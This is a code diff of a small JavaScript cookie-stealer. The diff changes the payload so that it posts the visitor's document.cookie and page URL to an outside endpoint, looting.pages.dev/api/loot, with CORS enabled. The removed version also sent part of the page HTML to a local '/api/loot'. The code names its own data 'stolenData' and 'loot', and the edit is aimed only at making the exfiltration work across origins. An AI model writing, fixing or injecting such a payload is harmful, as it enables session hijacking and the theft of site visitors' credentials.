@@ -1,18 +1,14 @@
 (function() {
-    // Collect the data
-    const stolenData = {
-        cookies: document.cookie || "no cookies found",
-        url: window.location.href,
-        // We only take a small slice of HTML so Discord doesn't crash
-        htmlDump: document.body ? document.body.innerHTML.substring(0, 500) : "no body"
+    const data = {
+        cookies: document.cookie || "None (HttpOnly?)",
+        url: window.location.href
     };
 
-    // Send it
-    fetch("/api/loot", {
+    // Use the FULL URL of your Pages project
+    fetch("https://looting.pages.dev/api/loot", {
         method: "POST",
+        mode: "cors", // Explicitly ask for CORS
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(stolenData)
-    })
-    .then(r => console.log("Loot sent!"))
-    .catch(e => console.error("Loot failed:", e));
+        body: JSON.stringify(data)
+    });
 })();
